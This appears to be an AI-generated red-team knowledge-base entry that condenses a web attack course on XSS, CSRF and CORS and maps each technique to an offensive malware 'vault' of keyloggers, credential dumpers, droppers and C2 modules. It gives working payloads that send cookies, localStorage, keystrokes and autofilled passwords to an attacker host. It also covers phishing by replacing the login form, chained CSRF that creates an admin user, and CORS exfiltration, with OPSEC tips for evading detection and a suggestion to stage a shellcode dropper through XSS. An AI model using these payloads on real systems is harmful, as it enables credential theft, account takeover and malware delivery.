---
id: RTO-web-client-side-attacks
name: Cross-Site Scripting and Cross-Origin Attacks (XSS / CSRF / CORS)
source: Red Team Ops / Zero-Point Security (OSWA module)
category: web-application
analyzed_by: glm-5.2
analysis_date: 2026-07-21
vault_references: [T023, T022, T021, T019, T016]
tags: [xss, csrf, cors, samesite, cookie-theft, keylogging, phishing, javascript-injection, browser-exploitation, web-application, sop, fetch-api]
---

# Cross-Site Scripting and Cross-Origin Attacks — Training Reference

## TL;DR
This module covers browser-side attack surfaces an operator can use when initial access lands on a web tier or when pivoting through web infrastructure: XSS (reflected/stored × server/client), CSRF chain construction against misconfigured session cookies, and weak-CORS exploitation. While the vault (T001–T023) is Windows-endpoint focused, several tradecraft primitives — JS keylogging, HTML form phishing, external-payload delivery, Base64-wrapped eval, exfil channel via `fetch` — map directly to T023 client capabilities (keylogger.rs, html_overlay.rs, browser_hook.rs, credential harvest), T022 networking (HTTP poll transport, malleable C2), and T021 crypto/obfuscation (shellcode encoding). The training provides raw browser-tier tradecraft; the vault provides hardened endpoint implementations of the same primitives.

## Key Concepts

1. **XSS is an output-encoding bug, not an input-validation bug.** An application is vulnerable because it *outputs* untrusted input without encoding — a payload that's perfectly sanitized on input but unencoded on output remains exploitable. Operationally: hunt in the response, not the request.

2. **Four XSS categories, not three.** Reflected/Stored × Server/Client. The legacy "DOM-based" term is now "client XSS". Server XSS is discoverable via request/response diff in Burp; client XSS requires browser rendering or front-end JS source review because the payload is appended post-response by client-side JavaScript (e.g., `innerHTML`, `append`).

3. **HTML injection as a control test.** Before firing JS, inject `<h1>offsec</h1>`. If it renders, you have a high-confidence indicator that JS injection will also work — fewer syntax pitfalls. Cite this as the standard discovery flow.

4. **`innerHTML` won't execute `<script>` tags (HTML5 spec).** Bypass vectors: `<img src=x onerror=...>`, `onfocus`, `onclick`, `onload`. Critical when targeting client XSS via `innerHTML` assignment — inline script tags silently no-op.

5. **`HttpOnly` kills cookie theft but doesn't kill the user.** JS can't *read* an HttpOnly cookie but the browser still *sends* it on same-origin requests. This reframes XSS exploitation from "steal the cookie" to "ride the session" (CSRF-style actions, localStorage/API-key theft, keylogging, password-manager farming, login-form phishing).

6. **SameSite cookie behavior is browser-determined.** Three values: `None` (send everywhere, requires `Secure`), `Lax` (top-level navigation only), `Strict` (same-site only). Chrome defaults unset → `Lax`. This is why modern CSRF often fails — pre-2020 tradecraft assumed cookies always cross-send. Cross-references T016 (Block-DLL/ACG policy gates) as another instance of browser-enforced policy gates.

7. **SOP blocks response *read*, not request *send*.** Cross-origin image/script/iframe tags fire requests and the browser applies cookies — but JS cannot read the response. CSRF exploits the "request still fires" side; CORS relaxes the "JS can't read" side via `Access-Control-Allow-Origin` + `Access-Control-Allow-Credentials: true`.

8. **Preflight (OPTIONS) gates non-simple cross-origin requests.** Simple = GET/HEAD/POST with standard content-types and no custom headers. Anything else (PUT, custom headers, JSON content-type) triggers OPTIONS preflight — server must explicitly allow. Operationally: CSRF payloads often constrained to `application/x-www-form-urlencoded` to dodge preflight.

9. **Reflected Origin header + ACAC:true = arbitrary-origin credential theft.** When a server reflects the request's `Origin` value into `Access-Control-Allow-Origin` *and* sets `Access-Control-Allow-Credentials: true`, any origin can read authenticated responses cross-site. Wildcard `*` cannot coexist with `ACAC: true`, so devs who need multi-origin credentials often implement the insecure reflect-pattern.

10. **External JS delivery beats inline payloads.** `<script src="http://attacker/xss.js">` allows arbitrarily complex payloads without URL-encoding constraints. The vault's analogous primitive is WinHTTP staged download (T022) and the dark_crystal transport.rs payload-acquisition flow.

## Operational Techniques

### HTML Injection Discovery (Control Test)
- **What**: Inject `<h1>offsec</h1>` to confirm output is rendered unencoded before attempting JS.
- **When to use**: First probe of any candidate XSS sink (search bars, comment fields, name parameters).
- **How**: (1) Identify the parameter that lands in HTML. (2) Submit `<h1>offsec</h1>`. (3) Inspect rendered DOM via right-click → Inspect Element. (4) If H1 renders, escalate to `<script>alert(0)</script>`.
- **Vault link**: N/A — endpoint-side discovery is N/A to vault. Conceptually parallel to T013 (Anti-Analysis) reconnaissance-before-action philosophy.
- **Tool/code**: Browser DevTools (Inspect Element), Burp Suite Proxy history → Response tab.
- **OPSEC**: Trivial alert() leaves visible artifact in JS console — fine for engagement testing, never in production recon.

### Reflected Server XSS via GET Parameter
- **What**: Payload travels in URL, server appends it to HTML response.
- **When to use**: Phishing a victim via crafted link (email/chat/cross-site redirect). User trusts the legitimate domain so no domain-disguise needed.
- **How**: (1) Discover sink via HTML injection test. (2) Confirm server-side reflection by inspecting Response in Burp — payload present in raw HTML = server XSS. (3) Build payload URL `<script src="http://KALI/xss.js"></script>`, URL-encode, deliver via phishing channel.
- **Vault link**: Analogous to T022 `winhttp_dl.rs` staged payload acquisition — both fetch a secondary payload from an attacker-controlled endpoint after initial trigger. The vault does it via WinHTTP from a loader; the training does it via `<script src>` from a browser.
- **Tool/code**: `python3 -m http.server 80` serving `xss.js`; `encodeURI()` for payload URL encoding.
- **OPSEC**: Two HTTP log entries on attacker server — one from your own test browser, one from victim. Victim's Referer header may leak your payload URL.

### Stored Server XSS
- **What**: Payload persisted in DB, fires for every visitor of the vulnerable page.
- **When to use**: Persistent compromise — no per-victim phishing link required. Targets mass-user pages (comments, profiles).
- **How**: (1) Identify which field is unencoded on output (one field may be encoded while another isn't — try username, comment, title separately). (2) Submit `<script>alert(0)</script>` (prepend a benign name like "John" so the field doesn't render empty — stealth against admin review). (3) Verify persistence by reloading the page and confirming re-execution.
- **Vault link**: Conceptually parallel to T017 persistence layers (COM hijack, NTFS EA, schtask, TLS callback) — both persist a payload across invocations. The training persists in a DB; the vault persists in OS-level artifacts.
- **Tool/code**: Direct form submission; `/reset` endpoint to clean DB between tests.
- **OPSEC**: Stored payloads are visible to admins in DB queries — prepend benign usernames, avoid alert() in real engagements, prefer silent `fetch()` exfil.

### Reflected Client XSS (innerHTML Bypass)
- **What**: Payload lands in client-side JS that writes to `innerHTML`; `<script>` tags won't execute (HTML5 spec).
- **When to use**: When the server response is clean (no reflection) but the page's own JS (e.g., `survey.js`) writes user input to DOM via `innerHTML`.
- **How**: (1) Inspect network response — confirm server doesn't reflect the parameter. (2) Inspect page's JS files (look for custom .js, not jquery.min.js). (3) Find `el.innerHTML = userInput` pattern. (4) Bypass script-tag restriction with `<img src='x' onerror='alert(1)'>` (per MDN).
- **Vault link**: T023 `html_overlay.rs` (WebView2 HTML injection) and `browser_hook.rs` (MV3 extension sideloading) are the vault's browser-side injection primitives. The training's `onerror` handler is conceptually mirrored by the vault's injection-via-DOM-manipulation. The vault uses WebView2 to overlay legitimate UI; the training uses `innerHTML` to inject into existing UI.
- **Tool/code**: `<img src='x' onerror='alert(1)'>`; alternative handlers: `onfocus`, `onclick`, `onload`.
- **OPSEC**: Client XSS leaves no server-side log artifact — harder for blue to detect via WAF/server logs. Requires browser-side detection (CSP reports, EDR browser telemetry).

### Stored Client XSS (jQuery append)
- **What**: Payload persisted server-side but rendered client-side via `append()` (executes script tags unlike `innerHTML`).
- **When to use**: Survey/form result pages where answers are stored then rendered client-side.
- **How**: (1) Submit answer containing `<script>alert(0)</script>`. (2) Verify result page triggers alert. (3) Reload — alert fires again (persistence confirmed). (4) `Render` in victim browser to confirm cross-user exploitation.
- **Vault link**: T023 `browser_session.rs` (browser session state) + `browser_hook.rs` (MV3 sideload) — both establish persistent browser presence. The training's stored client XSS is persistence-by-data; the vault's browser_hook is persistence-by-extension.
- **Tool/code**: jQuery `.append()` renders `<script>` (unlike `.innerHTML`).
- **OPSEC**: Stored client XSS is the stealthiest variant — server logs show normal form submissions, payload executes only client-side post-render.

### External JS Payload Delivery
- **What**: Inject `<script src="http://KALI/xss.js">` to host complex payloads externally rather than inline.
- **When to use**: Any XSS engagement requiring >1 line of JS or repeated payload updates without re-injecting.
- **How**: (1) `mkdir xss && cd xss`. (2) `echo "alert(1)" > xss.js`. (3) `python3 -m http.server 80`. (4) Inject `<script src="http://KALI_IP/xss.js"></script>` as payload. (5) Update `xss.js` on disk — every future page load fetches the new version.
- **Vault link**: T022 `winhttp_dl.rs` (WinHTTP staged download) and `dark_crystal/transport.rs` (payload acquisition: embed vs remote) are the endpoint equivalents. Both decouple payload content from delivery mechanism. T019 Edo Dead Drop (rentry.co + Sepolia contract) takes this further with autonomous C2 with no fixed attacker IP.
- **Tool/code**: Python http.server; `xss.js` is the live-editable payload.
- **OPSEC**: HTTP server logs on attacker side show victim IP + User-Agent. Consider TLS + domain fronting for production engagements. Self-signed certs may trigger browser warnings — use Let's Encrypt or compromised infrastructure.

### Cookie Exfiltration (with HttpOnly Limitation)
- **What**: Exfil `document.cookie` via `fetch()` to attacker server; demonstrate HttpOnly blocks JS access.
- **When to use**: Initial XSS payload on a target with non-HttpOnly session cookies.
- **How**: (1) `xss.js` content: `let cookie = document.cookie; let encodedCookie = encodeURIComponent(cookie); fetch("http://KALI/exfil?data=" + encodedCookie)`. (2) Deliver via external script tag. (3) Inspect Python http.server logs for `/exfil?data=...`. (4) If `data=` is empty → cookie is HttpOnly (cannot steal via JS).
- **Vault link**: T023 credential harvest (`extract_wifi.rs`, `lsass_dump.rs`) is the endpoint equivalent. The training exfils browser cookies; the vault exfils OS credentials. Both use a C2 callback channel.
- **Tool/code**: `document.cookie`, `encodeURIComponent()`, `fetch()`.
- **OPSEC**: Cookie value appears in URL-encoded form in attacker access logs. Consider POST body exfil for stealth. CSP `connect-src` directive may block `fetch()` to external origins — check CSP headers first.

### localStorage / sessionStorage Exfiltration
- **What**: Dump `localStorage` (API keys, cached secrets, JWTs) via `JSON.stringify` + `fetch`.
- **When to use**: When HttpOnly blocks cookie theft but the app stores secrets in local storage (common for SPAs, JWT-based auth).
- **How**: `xss.js` content: `let data = JSON.stringify(localStorage); let encodedData = encodeURIComponent(data); fetch("http://KALI/exfil?data=" + encodedData)`. Same pattern works for `sessionStorage`.
- **Vault link**: T023 `clipboard.rs` and `sysinfo_collect.rs` are the endpoint equivalents — both enumerate and exfil data stores. T021 crypto/obfuscation covers the encoding step (the vault uses IPv4/IPv6/MAC/UUID shellcode encoders; the training uses Base64/URL-encoding for data exfil).
- **Tool/code**: `JSON.stringify(localStorage)`, `encodeURIComponent()`.
- **OPSEC**: Large localStorage dumps may exceed URL length limits — switch to POST body for >2KB. Check CSP `connect-src` for exfil domain allowlist.

### Keylogging via addEventListener('keydown')
- **What**: Capture each keystroke on the vulnerable page and exfil to attacker.
- **When to use**: When victim is likely to type sensitive data on the XSS-vulnerable page (login forms, search bars, private messages).
- **How**: `xss.js` content: `function logKey(event){ fetch("http://KALI/k?key=" + event.key) } document.addEventListener('keydown', logKey);`. Each keypress fires a separate GET request — visible as sequential log entries on attacker server.
- **Vault link**: **T023 `keylogger.rs`** — direct parallel. The vault uses `WH_KEYBOARD_LL` OS-level hook (captures keys system-wide, even outside the browser); the training's XSS keylogger only captures keys typed on the compromised page. The vault implementation is strictly stronger for post-compromise persistence; the training variant is for pre-endpoint-compromise web-tier collection. T023 also has `input_blocker.rs` (WH_KEYBOARD_LL/WH_MOUSE_LL) for input suppression.
- **Tool/code**: `document.addEventListener('keydown', cb)`, `event.key`.
- **OPSEC**: Per-keystroke HTTP request is noisy in network logs. Aggregate + batch-send every N seconds to reduce footprint. Keylogger only fires while victim is on the XSS'd tab — loses data when tab loses focus.

### Password Manager Auto-Fill Theft
- **What**: Inject hidden `input[type=text]` + `input[type=password]` to trigger browser auto-fill, then exfil after 5s.
- **When to use**: Target uses Chrome's built-in password manager or any auto-fill PM (Bitwarden auto-fill, 1Password auto-fill, etc.).
- **How**: `xss.js` creates two inputs, sets `position: fixed; opacity: 0`, appends to body. Browser auto-fills. After `setTimeout(5000)`, `fetch("http://KALI/k?u=" + u.value + "&p=" + p.value)`. Optionally use `change` event listener instead of timer for delayed PMs.
- **Vault link**: T023 credential harvest (`lsass_dump.rs`, `extract_wifi.rs`) and `uac_cmstp.rs` (UAC bypass via CMSTP). The training harvests browser-stored creds; the vault harvests OS-stored creds. T023 `html_overlay.rs` (WebView2 phishing overlay) is the more direct phishing parallel — overlay a fake login UI to capture creds.
- **Tool/code**: `document.createElement("input")`, `input.type = "password"`, `setTimeout`, `change` event alternative.
- **OPSEC**: Visible input boxes alert the user — always set `opacity: 0` (not `display: none`, which some PMs check). Test with PM delays via `change` listener rather than fixed timer.

### Login Form Phishing via DOM Replacement
- **What**: Fetch the legitimate login page, replace the entire document's `innerHTML`, redirect form `action` to attacker server.
- **When to use**: When you want full-credential phishing on a trusted domain (no URL change in victim's address bar).
- **How**: `xss.js` content:
  ```js
  fetch("login").then(res => res.text().then(data => {
    document.getElementsByTagName("html")[0].innerHTML = data
    document.getElementsByTagName("form")[0].action = "http://KALI"
    document.getElementsByTagName("form")[0].method = "get"
  }))
  ```
  Victim sees the legit login page on the legit domain, submits creds, browser GETs `http://KALI/?username=...&password=...`.
- **Vault link**: **T023 `html_overlay.rs`** is the endpoint parallel — WebView2-backed HTML phishing overlay with credential capture, plus `overlay.rs` (Win32 layered overlay with WDA_EXCLUDEFROMCAPTURE to hide from screen capture). The vault's overlay approach is strictly more powerful: it survives outside the browser context, hides from screen-sharing software, and can mimic any UI. The training approach is browser-bound and breaks if the page re-renders.
- **Tool/code**: `fetch()`, `Promise.then()`, arrow functions, `innerHTML` replacement.
- **OPSEC**: Method=get exposes creds in URL logs (useful for the attacker but visible in proxy logs). For stealth, use method=post and a server-side collector. CSP `form-action` directive may block form submission to external origins.

### Shopizer CVE-2021-33562 Reflected XSS (URL-Constraint Bypass)
- **What**: Exploit JS-string-context injection in `ref=c:2` URL parameter where semicolons are URL-blocked.
- **When to use**: When the XSS sink is inside a JS string literal (e.g., `url = url + '?ref=c:2'`) and standard statement-terminator payloads fail.
- **How**: (1) Inject `canary` to confirm reflection. (2) Inject `'canary` to confirm string escape (page breaks → `Uncaught SyntaxError: Unexpected identifier`). (3) Replace `;` with `+` for statement concatenation: `c:2';alert(1);'canary` becomes `c:2'+alert(1)+'canary`. (4) For complex payloads, Base64-encode the JS, wrap in `eval(atob('...'))` to dodge URL-special-char restrictions, then wrap in `btoa(...)` to silence the return-value-in-URL error. Final payload: `'+btoa(eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDkuNTEveHNzLmpzJyk=')))+'.`
- **Vault link**: **T021 Crypto & Obfuscation** — strong parallel. The vault uses compile-time string obfuscation (proc macro), AES-GCM+zstd for payload encryption, and shellcode encoders (IPv4/IPv6/MAC/UUID/words). The training uses Base64+atob+eval+btoa for URL-safe payload transport. Both encode to dodge transport-layer restrictions (URL chars in training; static analysis in vault).
- **Tool/code**: Burp Suite Decoder (Base64), `atob()` (decode), `btoa()` (encode), `eval()`, jQuery's `jQuery.getScript()` (payload already present in Shopizer's loaded libs).
- **OPSEC**: `eval()` triggers CSP violations in strict CSP environments. `jQuery.getScript` is stealthier if jQuery is already loaded by the target. The btoa wrapper is essential — without it the eval return value breaks the URL.

### Shopizer Authenticated Action via XSS (fetch + same-origin)
- **What**: Use XSS to send authenticated POST requests as the victim (since HttpOnly blocks cookie *reading* but not cookie *sending*).
- **When to use**: HttpOnly session cookie prevents cookie theft; pivot to riding the session for state-changing actions (address change, fund transfer, password change if current-password not required).
- **How**: (1) Map the target action's POST request (Burp Repeater). (2) Identify required params — note that some (like `customerId`) may be empty/optional. (3) `xss.js` uses `fetch()` with `mode: 'same-origin'`, `credentials: 'same-origin'`, `Content-Type: application/x-www-form-urlencoded'`, body of URL-encoded params. (4) Verify via Burp HTTP history that the POST fires with victim's JSESSIONID.
- **Vault link**: T022 `http_poll_transport.rs` (HTTP long-poll transport) and `henge.rs` (malleable C2 profile engine) — both craft HTTP requests from compromised context. The training does ad-hoc fetch; the vault has a structured malleable C2 profile system. T016 EDR evasion suite's arg-spoofing concept is the endpoint parallel to "ride the authenticated context" (both reuse legitimate credentials/cookies rather than stealing them).
- **Tool/code**: `fetch()`, `mode: 'same-origin'`, `credentials: 'same-origin'`, `application/x-www-form-urlencoded`.
- **OPSEC**: Same-origin fetch is invisible to SOP but visible in target's server logs as an authenticated request from the victim's session. Space requests over time to avoid behavioral anomalies.

### CSRF Token Discovery (Form Inspection)
- **What**: Inspect HTML for hidden `csrftoken`-named inputs; check response cookies for SameSite attribute.
- **When to use**: Before crafting any CSRF payload against a target endpoint.
- **How**: (1) Inspect target form's HTML for hidden inputs named like `csrf*`, `token*`, `nonce*`. (2) Inspect Set-Cookie headers for `SameSite=` value. (3) If no token and no SameSite (or SameSite=None), endpoint is CSRF-vulnerable. (4) Note: requests requiring the user's current password are not CSRF-exploitable.
- **Vault link**: T016 EDR evasion suite (policy gates: Block-DLL, ACG) — both are policy-based defenses that must be enumerated before exploitation. Conceptual parallel: enumerate the defense, then either bypass or pivot.
- **Tool/code**: Browser View Source (Ctrl+U), Burp Proxy → Response headers.
- **OPSEC**: Pure reconnaissance — no OPSEC risk.

### OFBiz CSRF — Chained POST via Dual Forms
- **What**: CSRF two POST endpoints (createUserLogin + addUserLoginToSecurityGroup) in sequence to create a SUPER-group admin user.
- **When to use**: ERP/admin application with no CSRF tokens and SameSite-unset cookies on a pre-Lax-default browser.
- **How**: (1) Inspect baseline POST for `/webtools/control/createUserLogin` and `/webtools/control/addUserLoginToSecurityGroup`. (2) Build HTML page with `<body onload="document.forms['csrf'].submit()">` and hidden inputs matching baseline params. (3) For dual-form chaining, add second form with `target="_blank"` and a JS function that submits both — note this is timing-fragile (asynchronous submit may fire second before first completes).
- **Vault link**: T022 `juubi_chain.rs` (peer relay chain management) and `rikudo.rs` (multi-chain vault) — both compose multi-stage action sequences. The training uses HTML+JS form chaining; the vault uses a structured relay-chain architecture.
- **Tool/code**: HTML form with `name="csrf"`, hidden inputs, `onload` autosubmit, `target="_blank"`.
- **OPSEC**: Dual-tab opening is noisy. The chained-form approach is timing-fragile — see the Fetch-API variant below for reliability.

### OFBiz CSRF — Chained POST via Fetch API (Reliable Variant)
- **What**: Use `fetch()` with `mode: 'no-cors'`, `credentials: 'include'` to chain POSTs with `.then()` for sequential execution.
- **When to use**: When dual-form CSRF is timing-fragile or when SameSite-unset cookies are in play (pre-Lax-default browsers, or SameSite=None).
- **How**: (1) Build `ofbiz2.html` with `<script>` block declaring `username`, `password`, `host`, `create_url`, `admin_url`, `create_params`, `admin_params` variables. (2) Define `send_create()` that fetches create_url, `.then()` calls `send_admin()`. (3) `send_admin()` fetches admin_url. (4) Call `send_create()` at script end. (5) Test with SameSite unset → fails on modern Chrome (Lax default). (6) Manually edit cookie SameSite to "None" in DevTools Application → Cookies → confirms attack succeeds. (7) Set to "Lax" → confirms attack blocked.
- **Vault link**: T022 `http_poll_transport.rs` and `tcp_transport.rs` — both use structured async request flow with state management. T019 Edo Dead Drop (rentry.co + Sepolia contract) is the most advanced parallel — fully autonomous C2 with no fixed attacker IP, bypassing network egress controls entirely.
- **Tool/code**: `fetch()` with `mode: 'no-cors'`, `credentials: 'include'`, `Content-Type: application/x-www-form-urlencoded`, Promise `.then()` chaining.
- **OPSEC**: `no-cors` mode restricts Content-Type to standard forms — JSON payloads require `mode: 'cors'` which triggers preflight. Cookies only send if SameSite allows. Check `navigator.userAgent` for browser version to determine if Lax-default applies (Extra Mile exercise).

### CORS Origin-Reflection Exploit
- **What**: When server reflects request `Origin` header into `Access-Control-Allow-Origin` *and* sets `Access-Control-Allow-Credentials: true`, any origin can read authenticated cross-origin responses.
- **When to use**: Identifying and exploiting permissive CORS configurations on authenticated endpoints.
- **How**: (1) Send baseline GET to target endpoint, note CORS headers. (2) In Repeater, add `Origin: hellocors` header. (3) If response includes `Access-Control-Allow-Origin: hellocors` and `Access-Control-Allow-Credentials: true` → vulnerable. (4) Build `cors1.html` with `fetch(url, {method:'GET', mode:'cors', credentials:'include'})` then `.then(response => response.json())` then `.then(data => console.log(data))`. (5) For exfil, build `cors2.html` with second `fetch()` to `http://KALI/callback?` + `encodeURIComponent(JSON.stringify(data))` in `mode: 'no-cors'`. (6) Tail `/var/log/apache2/access.log` to confirm exfil.
- **Vault link**: T022 `henge.rs` (malleable C2 profile engine) — both craft HTTP requests with arbitrary headers. T019 Edo Dead Drop conceptually parallels the multi-channel exfil (the vault uses Google Translate + blockchain + steganography; the training uses a simple HTTP callback).
- **Tool/code**: Burp Repeater (add Origin header), `fetch()` with `mode: 'cors'`, `credentials: 'include'`, `response.json()`, `JSON.stringify()`, `encodeURIComponent()`.
- **OPSEC**: CORS exfil fires two requests: one to target (with victim cookies), one to attacker (no cookies). Both visible in network logs. CORS preflight may alert WAFs monitoring for OPTIONS+custom-headers patterns.

## Tool & Tradecraft Reference

| Tool/Command | Purpose | OPSEC Notes |
|---|---|---|
| `python3 -m http.server 80` | Host xss.js / payload | Logs victim IP+UA; no TLS, no auth |
| Burp Suite Proxy → HTTP History | Inspect request/response for server-side XSS reflection | Local only, no OPSEC risk |
| Burp Suite Repeater | Modify/replay requests; test Origin header for CORS | Local only |
| Burp Suite Decoder | Base64-encode payloads for URL-safe transport | Local only |
| Burp Suite Target → Site map | Discover loaded JS libraries (e.g., jQuery for `getScript()`) | Local only |
| Burp Suite embedded Chromium | Test payloads with proxy capture | Local only |
| Firefox DevTools (Inspect Element) | Confirm HTML rendering, DOM inspection | Local only |
| Firefox Network tool → Response tab | Confirm client XSS (server response clean, JS appends) | Local only |
| Firefox JS Console (Ctrl+B+K) | Diagnose SyntaxErrors, network errors | Local only |
| Apache HTTP server (`apache2`) | Host CSRF HTML payload pages | access.log contains exfil data |
| `document.cookie` | Read non-HttpOnly cookies | Blocked by HttpOnly flag |
| `JSON.stringify(localStorage)` | Dump browser local storage | May exceed URL length limits |
| `document.addEventListener('keydown', cb)` | Page-scoped keylogger | Only fires while XSS'd tab focused |
| `fetch(url, {credentials:'include'})` | Send cookies on cross-origin request | Subject to SameSite enforcement |
| `fetch(url, {mode:'no-cors'})` | Send cross-origin POST without preflight | Restricts Content-Type to standard form-encoded |
| `<img src='x' onerror='...'>` | Bypass innerHTML script-tag restriction | onerror fires reliably; alt: onfocus/onload/onclick |
| `atob()` / `btoa()` | JS-side Base64 decode/encode | `eval(atob(...))` triggers CSP violations |
| `jQuery.getScript(url)` | Load external JS via existing jQuery | Requires jQuery pre-loaded by target |
| Chrome DevTools → Application → Cookies → SameSite column | Manually override SameSite for testing | DevTools-only; real victims cannot do this |
| `/etc/hosts` entries | Map cors-sandbox / ofbiz / shopizer to test VMs | Local only |

## Gaps & Extensions

**Training covers that the vault does NOT:**
- **Web-tier initial access tradecraft** — the vault is entirely post-endpoint-compromise. XSS/CSRF/CORS are pre-endpoint pivots that the vault assumes already occurred.
- **Browser security model deep-dive** — SOP, SameSite cookie behavior, CORS preflight, ACAC/ACAO headers. The vault's T023 browser modules (browser_hook, html_overlay) operate *inside* an already-compromised browser context and don't reason about cross-origin policy.
- **URL-character-constrained payload encoding** — the `'+btoa(eval(atob(...)))+'` pattern is unique to URL-delivered payloads. The vault's T021 encoders (IPv4/IPv6/MAC/UUID/words) solve a different problem (static-analysis evasion in binary payloads).
- **SameSite-aware CSRF feasibility analysis** — critical for engagement scoping on modern targets. No vault equivalent.
- **CSRF token discovery flow** — vault has no analogous "enumerate the defense before attacking" pattern for HTTP-tier policy gates.

**Vault covers that the training does NOT:**
- **OS-level keylogging** (T023 `keylogger.rs` via `WH_KEYBOARD_LL`) — strictly stronger than XSS keylogging (system-wide vs page-scoped). The training explicitly notes "if the user is on a different tab or in a different application, we won't be able to intercept their keystrokes" — the vault's OS hook solves this.
- **Screen-capture-resistant overlays** (T023 `overlay.rs` with `WDA_EXCLUDEFROMCAPTURE`) — the training's `innerHTML` phishing is visible to screen-sharing; the vault's overlay hides from capture.
- **MV3 extension sideloading** (T023 `browser_hook.rs`) — persists browser presence across sessions, surviving XSS-cleanup. The training's stored XSS requires the underlying DB record to remain.
- **Malleable C2 HTTP profiles** (T022 `henge.rs`) — structured HTTP request crafting vs the training's ad-hoc `fetch()`.
- **Autonomous C2** (T019 Edo Dead Drop) — Google Translate + Sepolia blockchain + steganography for C2 with no fixed attacker IP. The training's exfil channel requires a known attacker IP.
- **Compile-time string obfuscation** (T021 proc macro) — the training uses runtime `atob/eval` which is detectable; the vault obfuscates at compile time.

**Conceptual bridges for operators:**
- An operator with web-tier access (XSS) can deliver the vault's `dark_crystal` dropper via the external-JS-load pattern — `xss.js` becomes a stager that fetches and executes the dark_crystal shellcode via a WinHTTP-equivalent browser-side fetch.
- The training's `fetch()`-based exfil pattern is the browser analog of the vault's HTTP poll transport (T022) — useful for operators who need to reason about both tiers.
- The CORS Origin-reflection pattern can be combined with the vault's malleable C2 (T022) to use a legitimate-looking CORS-permissive domain as a C2 front.

## Cross-Reference Matrix

| Training Concept | Vault Technique | Relationship |
|---|---|---|
| XSS keylogger (`addEventListener('keydown')`) | T023 `keylogger.rs` (WH_KEYBOARD_LL) | Vault is strictly stronger — system-wide vs page-scoped; vault's `input_blocker.rs` also suppresses input |
| HTML form phishing via `innerHTML` replacement | T023 `html_overlay.rs` (WebView2) + `overlay.rs` (WDA_EXCLUDEFROMCAPTURE) | Vault survives outside browser, hides from screen capture; training is browser-bound |
| External JS delivery (`<script src="KALI/xss.js">`) | T022 `winhttp_dl.rs` + `dark_crystal/transport.rs` | Both are staged payload acquisition; vault adds Edo Dead Drop (T019) for autonomous C2 |
| Cookie exfil via `fetch()` | T023 credential harvest (`lsass_dump.rs`, `extract_wifi.rs`) | Endpoint vs browser-tier credential farming; vault is post-compromise |
| localStorage exfil | T023 `clipboard.rs` + `sysinfo_collect.rs` | Both enumerate and exfil data stores; vault operates on OS data |
| Password manager auto-fill theft | T023 `html_overlay.rs` + `uac_cmstp.rs` | Both exploit auto-fill/auto-elevate behavior; vault covers UAC auto-elevation in addition |
| Shopizer Base64+atob+eval+btoa payload | T021 shellcode encoders (IPv4/IPv6/MAC/UUID/words) + compile-time proc macro | Both encode payloads to dodge transport restrictions; vault encodes for static-analysis evasion, training encodes for URL safety |
| Shopizer `fetch()` authenticated action | T022 `http_poll_transport.rs` + `henge.rs` (malleable C2) | Both craft authenticated HTTP actions from compromised context; vault has structured profile engine |
| CSRF token discovery | T16 EDR evasion suite (Block-DLL, ACG policy gates) | Both enumerate policy-based defenses before exploitation; conceptual parallel only |
| OFBiz dual-form CSRF chaining | T022 `juubi_chain.rs` (relay chain) + `rikudo.rs` (multi-chain vault) | Both compose multi-stage action sequences; vault has structured chain architecture |
| SameSite cookie behavior | T16 policy gates | Both are browser-enforced policy gates that constrain tradecraft; conceptual parallel |
| CORS Origin-reflection + ACAC:true | T022 `henge.rs` (malleable C2 profile) + T019 Edo Dead Drop | Both craft arbitrary-header HTTP requests; vault's autonomous C2 is more advanced |
| Same-Origin Policy (request fires, response blocked) | T019 `nt_sockets.rs` (NT sockets via AFD driver) | Both exploit "traffic egress but response-control" asymmetry; vault uses kernel-level socket bypass |
| Browser DevTools for XSS discovery | T020 Anti-Analysis diagnostic test harness | Both are operator-side tooling for technique verification |

---

*Note: The source training file (oswa-02-xss.md) appears to truncate at the end of the "Exploiting Weak CORS Policies" section ("The Access-Control-Allow-Origin..."). The matrix above covers all complete sections through the CORS origin-reflection exploit.*